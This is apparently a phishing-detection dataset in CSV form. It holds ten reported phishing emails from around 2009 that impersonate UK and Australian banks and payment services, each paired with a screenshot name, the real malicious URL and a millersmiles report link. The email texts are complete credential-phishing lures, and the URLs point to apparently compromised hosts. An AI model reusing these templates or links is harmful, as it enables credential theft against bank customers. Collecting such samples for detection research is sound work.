email_text,screenshot,URL,Details_Link
"﻿

<br />

Abbey<br />

Your online account has been suspended (reason: the violation of terms of service). Although your account has been suspended in May data will be available<br />

for a maximum of 15 days. After which it will be deleted.If you think this suspendion a mistake.<br />

Please click here as soon as possible.<br />

Thank you,<br />

Abbey.Co.Uk Support http://www.abbey.co.uk<br />

millersmiles.co.uk Phishing scam report",1.png,http://www.verifier-votrecompte.com,http://www.millersmiles.co.uk/email/abbey-bank-alert--new-message-security-abbey-national-plcc
"﻿

<br />

Alliance Leicester<br />

Dear Customer<br />

Weâ€TMre sorry, but we were unable to verify your online account identity. In order to protect the security of the account,<br />

we have terminated your online banking session.<br />

In order to resolve this situation,<br />

We implore you to click on VERIFY below to verify any possible findings.<br />

VERIFY<br />

Thank you.<br />

Click here to get the very best of AOL, including news, sport, gossip, lifestyles updates and email.<br />

millersmiles.co.uk<br />

Phishing scam report",2.png,http://ozutour.com/wizboard/uploadactivex/fileman/ img/allixgincxis.php,http://www.millersmiles.co.uk/email/customer-account-alert-confirm-your-online-customer-id-alliance--leicester
"﻿

<br />

Dear Abbey Member,<br />

Due to concerns, for the safety and integrity of the Abbey account we have<br />

issued this warning message.<br />

It has come to our attention that your Abbey account information needs to<br />

be updated as part of our continuing commitment to protect your account in<br />

this year 2009 and to reduce the instance of fraud on our website. If you<br />

could please take 5-10 minutes out of your online experience and update<br />

your personal records you will not run into any future problems with the<br />

online service.<br />

Once you have updated your account records your Abbey account service will<br />

not be interrupted and will continue as normal.<br />

To update your Abbey records click on the following link: http://myonlineaccounts2.abbeynational.co.uk.isapii.net/Abbey/index.htm<br />

Accounts Management As outlined in our User<br />

Agreement, Abbey will<br />

periodically send you information about site changes and enhancements.<br />

Regards,<br />

Abbey Member Services Team<br />

Learn more about selling with confidence.<br />

millersmiles.co.uk<br />

Phishing scam report",3.png,http://myonlineaccounts2.abbeynational.co.uk.isapi i.net/Abbey/index.htm,http://www.millersmiles.co.uk/email/customers-upgrade-abbey
"﻿

<br />

Message<br />

HALIFAX<br />

a little extra help<br />

Dear HBOS Customer,<br />

You have 1 new (Unread) message waiting in your inbox folder.<br />

Due to Various Invalid Attempt to login to Your Account<br />

please supply all of the following information<br />

Click here to read.<br />

Sincerely,<br />

Halifax Personal Banking<br />

*Please do not reply to this email as your reply will not be received*.<br />

millersmiles.co.uk<br />

Phishing scam report",4.png,http://asilgenclik.org.tr/templates/yoo_pulse/imag es/index.html,http://www.millersmiles.co.uk/email/halifax-personal-banking-you-have-1-new-unread-message-halifax-personal-banking
"﻿

<br />

(((((O<br />

moneybookers.com<br />

and money moves<br />

Attention!<br />

Dear Member Moneybookers,<br />

We recently noticed one or more attempts to log in to your moneybookers account from a foreign IP address. If you recently accessed your account while traveling, the unusual log in attempts may have been initiated by you. However, if you did not initiate the log ins, please visit moneybookers as soon as possible to verify your identity:<br />

https://www.moneybookers.com/app/login.pl<br />

Verify your identity is a security measure that will ensure that you are the only person with access to the account.<br />

Thanks for your patience as we work together to protect your account.<br />

Sincerely,<br />

Moneybookers 2009<br />

Moneybookers Security Reminders Protect Your Password<br />

Moneybookers and its representatives will NEVER ask you to reveal your password. There are NO EXCEPTIONS to this policy. If anyone asks for your password by phone moneybookers.com, refuse and immediately report this to security@moneybookers.com.<br />

Please do not reply to this email.This mailbox is not monitored and you will not receive a response.For assistance, log in to your moneybookers account and click the Help link located in the top right corner of any moneybookers page.<br />

Registered in England and Wales under Company No 4260907.<br />

Registered office: C3 Cairngorm House, Meridian Gate, 203 Marsh Wall, London E14 9YT.<br />

None of the information contained in this website constitutes, nor should be construed as Financial Advice<br />

millersmiles.co.uk<br />

Phishing scam report",5.png,http://82.178.38.184/moneybookers/app/loginpl/dire ctory.php?app=login.pl,http://www.millersmiles.co.uk/email/important-notification-of-moneybookers-account-moneybookers-9615
"﻿

<br />

mbna<br />

Dear Customer,<br />

MBNA Bank Online Banking, is here by announcing the NewSecurity Upgrade.<br />

We&#039;ve upgraded our new SSLservers to serve our<br />

customers for a better and<br />

secure banking service against any fraudulentactivities. Due to thisrecent upgrade,<br />

you are requested to update your account information by following the reference below.<br />

Reference*<br />

http://www.mbna.co.uk/personal/internet-banking/login/<br />

Regards<br />

Security and Privacy Department<br />

MBNA Online Bank.<br />

millersmiles.co.uk Phishing scam report",6.png,http://www.designurtee.com/service/cache/login/094 88drimmmf859./WelcomeScreen.html,http://www.millersmiles.co.uk/email/new-security-upgrade-mbna-online-banking
"﻿

<br />

You Have A New Account Message. Your Account Has Been limited<br />

click below to Login Your account Details.<br />

Login Here<br />

New Egg Online Helpdesk..<br />

A New Egg Security Team.<br />

||||<br />

||<br />

||<br />

||||<br />

||||<br />

|| ||<br />

||<br />

||<br />

FREE Animations for your email - by IncrediMail! Click<br />

Here!<br />

millersmiles.co.uk<br />

Phishing scam report",7.png,http://h1.ripway.com/eggsecuritylogon/new.egg.comc ustome.youraccount.html,http://www.millersmiles.co.uk/email/important-update-activate-your-egg-online-acces-new-egg-security-tm
"﻿

<br />

href<br />

http://www.alli<br />

ONLINE BANKING INFORMATION UPGRADE<br />

Thank you for banking online at Alliance &amp; Leicester. At Alliance &amp; Leicester bank, your security is our primary concern. And in order to guard against the recent spate of fraud and identity theft involving online account holders, we have recently introduced additional security measures and upgraded our software to protect our online account holders.<br />

The security upgrade will be effective immediately and requires our customers to update their access and Sign in Protection activation. Please Upgrade Your Information<br />

For your security, you won&#039;t be able to gain access to your accounts until you&#039;ve done this.<br />

(Do not reply to this email. Alliance &amp; Leicester retains the right to send<br />

you periodic updates on alerts and services).<br />

Click here to get the very best of AOL, including news, sport, gossip, lifestyles updates and email.<br />

millersmiles.co.uk<br />

Phishing scam report",8.png,http://www.kortedijk.nl/vve/modules/mybankrhnlogin s.html,http://www.millersmiles.co.uk/email/online-banking-information-upgrade-allianceleicester-bank
"﻿

<br />

Security Alert<br />

egg secure account update<br />

eggTM<br />

During our regular update and verification of Egg Online Services, we could not verify your current information. Either your information has been changed or incomplete. As a result, your online access has been limited. You can update your online details by following the link below<br />

https://new.egg.com/security/customer/update/logon<br />

Thank you for banking with Egg, the world&#039;s largest pure online bank.<br />

Regards<br />

The Egg Servicing Team<br />

Egg is a trading name of the Egg group of companies which includes:<br />

Egg plc (reg no 2448340), Egg Financial Intermediation Ltd (reg no 3828289), and Egg Banking plc (reg no 2999842). Egg Banking plc and Egg Financial Intermediation Ltd are authorised and regulated by the Financial Services Authority (FSA) and are entered in the FSA register under numbers 205621 and 309551 respectively. These members of the Egg group are registered in England and Wales. Registered office: 1 Waterhouse Square, 138-142 Holborn, London EC1N 2NA.<br />

This e-mail is confidential and for use by the addressee only. If you are not the<br />

intended recipient of this e-mail and have received it in error, please delete it from your mailbox. Internet e-mails are not necessarily<br />

secure.<br />

millersmiles.co.uk Phishing scam report",9.png,http://sudchao.anadyr.ru/images/gallery/files/fold ers/eGg.htm,http://www.millersmiles.co.uk/email/egg-secure-account-update-the-egg-servicing-team-9635
"﻿

<br />

ANE Internet Banking<br />

Dear ANZ iBanking Customer,<br />

Due to multiple attempt error while trying to login in to your ANZ Internet Banking Account. We believed that someone other than you is trying to access your Account For security reasons, we have temporarily Flagged your Online Access and your access to internet banking will be restricted if you fail to Verify and re-confirm your membership details.<br />

Verify your ANZ Internet Banking Access now to enjoy the benefits of online banking and finance to avoid fraudulent activities on your Account Due to the recent Security Update, To Confirm your Account click on the link below to continue:<br />

https://inetbanking.anz.com/ib/ib.jsp<br />

Thanks for taking the time to learn about our upcoming plan for Enhance Online Security - it&#039;s one more way that ANZ Bank Limited can makes your internet banking experience better..<br />

Copyright Australia and New Zealand Banking Group Limited (ANZ)<br />

FOR RESAMImationsfo ayunemail-by-IngrediMail! Click Here!<br />

millersmiles.co.uk<br />

Phishing scam report",10.png,http://banmai-school.org/board/avatars/Musicians/a nz.html,http://www.millersmiles.co.uk/email/reconfirm-your-anz-internet-banking-details-anz-internet-banking
